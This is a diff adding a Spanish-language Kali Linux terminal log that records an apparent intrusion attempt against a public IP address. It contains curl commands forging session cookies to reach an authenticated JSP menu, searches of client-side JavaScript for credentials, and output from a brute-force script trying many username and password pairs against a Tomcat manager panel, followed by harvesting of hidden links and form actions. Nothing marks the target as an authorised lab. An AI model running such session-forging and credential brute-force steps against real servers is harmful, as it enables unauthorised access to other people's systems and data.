@@ -1,0 +1,110 @@
+┌──(marco-os㉿Marco-Antonio)-[~/Escritorio/ProyectoSitoOfi-main/NuevoComienzoLinux/Scrpits]
+└─$ echo "=== EXPLOTANDO SESIONES VÁLIDAS ==="
+
+curl -k -b "JSESSIONID=00000000000000000000000000000000" \
+     "https://189.254.143.102/jsp/menu.jsp" -o menu_authenticated.html
+
+echo "Contenido de menu.jsp autenticado:"
+grep -i "form\|action\|input\|password\|user\|admin" menu_authenticated.html | head -20
+=== EXPLOTANDO SESIONES VÁLIDAS ===
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
+Contenido de menu.jsp autenticado:
+                                                                                 
+┌──(marco-os㉿Marco-Antonio)-[~/Escritorio/ProyectoSitoOfi-main/NuevoComienzoLinux/Scrpits]
+└─$ 
+
+──(marco-os㉿Marco-Antonio)-[~/Escritorio/ProyectoSitoOfi-main/NuevoComienzoLinux/Curls]
+└─$ # Analizar utilities.js para encontrar la lógica de autenticación
+echo "=== ANALIZANDO LÓGICA DE PASSWORD ==="
+
+# Buscar la función Password y contexto
+sed -n '/function Password/,/^function/p' utilities.js | head -30
+
+# Buscar llamadas a la función Password
+grep -n "Password(" utilities.js
+
+# Extraer cualquier cadena que parezca credencial
+grep -oE '"[A-Za-z0-9]{4,20}"' utilities.js | head -10
+=== ANALIZANDO LÓGICA DE PASSWORD ===
+        function Password(letra){
+                var data = "abcdefghijklmn�opqrstuvwxyzABCDEFGHIJKLMN�OPQRSTUVWXYZ0123456789";
+                var nav4 = window.Event ? true : false;
+                var key = nav4 ? letra.which : letra.keyCode;
+
+                if (data.indexOf(String.fromCharCode(key)) > -1 || key <= 12)
+                        return true;
+                else
+                        return false;
+        }
+
+        function General(letra){
+                var data = "abcdefghijklmn�opqrstuvwxyz����� ABCDEFGHIJKLMN�OPQRSTUVWXYZ�����()#0123456789-+/\(),.:";
+                var nav4 = window.Event ? true : false;
+                var key = nav4 ? letra.which : letra.keyCode;
+
+                if (data.indexOf(String.fromCharCode(key)) > -1 || key <= 12)
+                        return true;
+                else
+                        return false;
+        }
+
+        function Letras(letra){
+                var data = "abcdefghijklmn�opqrstuvwxyz ABCDEFGHIJKLMN�OPQRSTUVWXYZ-+()._";
+                var nav4 = window.Event ? true : false;
+                var key = nav4 ? letra.which : letra.keyCode;
+
+                if (data.indexOf(String.fromCharCode(key)) > -1 || key <= 12)
+                        return true;
+                else
+1:      function Password(letra){
+"0123456789"
+"0123456789"
+                                                                                
+┌──(marco-os㉿Marco-Antonio)-[~/Escritorio/ProyectoSitoOfi-main/NuevoComienzoLinux/Curls]
+└─$ 
+
+┌──(marco-os㉿Marco-Antonio)-[~/Escritorio/ProyectoSitoOfi-main/NuevoComienzoLinux/Scrpits]
+└─$ python3 FBInteligente.py  
+=== FUERZA BRUTA INTELIGENTE ===
+⚠️  Respuesta inusual con tono:SITO en /manager/html
+⚠️  Respuesta inusual con jose:UTSLP en /manager/html
+⚠️  Respuesta inusual con admin:SITO en /manager/html
+⚠️  Respuesta inusual con tono:utslp en /manager/html
+⚠️  Respuesta inusual con jose:sito en /manager/html
+⚠️  Respuesta inusual con admin:utslp en /manager/html
+⚠️  Respuesta inusual con tono:Utslp2024 en /manager/html
+⚠️  Respuesta inusual con jose:Utslp2024 en /manager/html
+⚠️  Respuesta inusual con sito:SITO en /manager/html
+⚠️  Respuesta inusual con utslp:UTSLP en /manager/html
+⚠️  Respuesta inusual con tono:ISCT2010 en /manager/html
+⚠️  Respuesta inusual con jose:ISCT2010 en /manager/html
+⚠️  Respuesta inusual con danyel:Spr@nch2010 en /manager/html
+⚠️  Respuesta inusual con dnylsp:SpRanch en /manager/html
+⚠️  Respuesta inusual con manager:manager en /manager/html
+⚠️  Respuesta inusual con tomcat:tomcat en /manager/html
+
+┌──(marco-os㉿Marco-Antonio)-[~/Escritorio/ProyectoSitoOfi-main/NuevoComienzoLinux/Scrpits]
+└─$ # Buscar enlaces y recursos en las páginas accesibles
+echo "=== EXTRAYENDO RECURSOS OCULTOS ==="
+
+# De menu.jsp autenticado
+if [[ -f "menu_authenticated.html" ]]; then
+    echo "Enlaces en menu.jsp:"
+    grep -o 'href="[^"]*"' menu_authenticated.html | head -20
+    grep -o 'src="[^"]*"' menu_authenticated.html | head -20
+fi
+
+# Buscar acciones de formulario
+grep -o 'action="[^"]*"' *.html | sort -u
+=== EXTRAYENDO RECURSOS OCULTOS ===
+Enlaces en menu.jsp:
+session_00000000000000000000000000000000__jsp_menu.jsp.html:action=""
+session_0123456789ABCDEF0123456789ABCDEF__jsp_menu.jsp.html:action=""
+session_1234567890ABCDEF1234567890ABCDEF__jsp_menu.jsp.html:action=""
+session_5AC92EC7B819B3474841A747FF58C063__jsp_menu.jsp.html:action=""
+session_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA__jsp_menu.jsp.html:action=""
+session_FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF__jsp_menu.jsp.html:action=""
+                                                                                
+                                                                                
